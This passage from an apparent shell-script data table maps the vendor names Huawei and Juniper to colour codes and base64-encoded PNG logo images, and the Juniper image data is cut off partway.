 										["Huawei"]='#B2B2B2 #980101 #222222 data:image/png;base64,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'
 										["Juniper"]='#B4CFF1 #A8A8A8 #4A4A4A data:image/png;base64,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